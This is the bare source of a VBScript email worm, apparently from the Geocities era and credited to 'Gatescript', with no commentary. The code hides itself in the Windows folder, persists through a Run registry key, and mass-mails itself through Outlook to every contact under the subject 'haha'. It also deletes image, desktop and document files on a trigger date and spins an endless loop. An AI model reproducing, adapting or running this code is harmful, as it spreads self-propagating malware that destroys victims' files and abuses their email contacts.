'KAVAR
ON ERROR RESUME NEXT
Dim DONOTEDITcmsgsqluql
Dim DONOTEDITcborrsqluql
Dim DONOTEDITccolsqluql
Dim zsqluql
Dim DONOTEDITnarsqluql
Dim DONOTEDITdisqluql
Dim DONOTEDITvalsqluql
Dim DONOTEDITsensqluql
Dim DONOTEDITtecsqluql
Dim vtecsqluql
Dim Cosqluql
Set DONOTEDITwshsqluql = CreateObject("WScript.Shell")
Set DONOTEDITfsosqluql= CreateObject("scripting.filesystemobject")
DONOTEDITfsosqluql.copyfile wscript.scriptfullname,DONOTEDITfsosqluql.GetSpecialFolder(0) & "\kruls1.vbs"
DONOTEDITwshsqluql.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\kruls","wscript.exe " & DONOTEDITfsosqluql.GetSpecialFolder(0) & "\kruls1.vbs %"
DONOTEDITwshsqluql.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
If DONOTEDITwshsqluql.regread("HKCU\software\kruls\correo") <> "1" Then
Outsqluql()
End If
Function Outsqluql()
ON ERROR RESUME NEXT
Set sqluqlApp = CreateObject("Outlook.Application")
If sqluqlApp = "Outlook" Then
Set msqluql = sqluqlApp.GetNameSpace("MAPI")
Set mdsqluql = msqluql.AddressLists
For Each Adlsqluql In mdsqluql
If Adlsqluql.AddressEntries.Count <> 0 Then
Set Mssqluql = sqluqlApp.CreateItem(0)
Mssqluql.Subject = "haha"
Mssqluql.Body = "goed gelachen?"
Mssqluql.Attachments.add DONOTEDITfsosqluql.GetSpecialFolder(0)& "\kruls1.vbs"
Mssqluql.DeleteAfterSubmit = True
For zsqluql = 1 To Adlsqluql.AddressEntries.Count
If Adlsqluql.AddressEntries.Count = 1 Then
Mssqluql.To = Adlsqluql.AddressEntries(zsqluql).Address
Else
Mssqluql.To = Mssqluql.To & "; " & Adlsqluql.AddressEntries(zsqluql).Address
End If
Next
Mssqluql.send
End If
Next
sqluqlApp.Quit
DONOTEDITwshsqluql.regwrite "HKCU\software\kruls\correo","1"
End If
End Function
If month(now) = 9 and day(now) = 10 Then
msgbox "you should see this funny pic"
End If
If month(now) = 8 and day(now) = 10 Then
DONOTEDITfsosqluql.deletefile ("C:\Windows\*.jpg")
DONOTEDITfsosqluql.deletefile ("C:\Windows\*.bmp")
DONOTEDITfsosqluql.deletefile ("C:\Windows\Escritorio\*.*")
DONOTEDITfsosqluql.deletefile ("C:\misdoc~1\*.*")
End If
DONOTEDITvalsqluql = 0
DONOTEDITtecsqluql = 0
disqluql()
Function disqluql()
On Error Resume Next
Do
DONOTEDITtecsqluql = DONOTEDITtecsqluql + 1
If DONOTEDITtecsqluql = 700000 Then
If month(now) = 7 and day(now) = 7 Then
DONOTEDITwshsqluql.sendkeys "Here we go!"
End If
DONOTEDITtecsqluql = 0
End If
Loop
End Function
'Gatescript - Geocities.com/gatescript
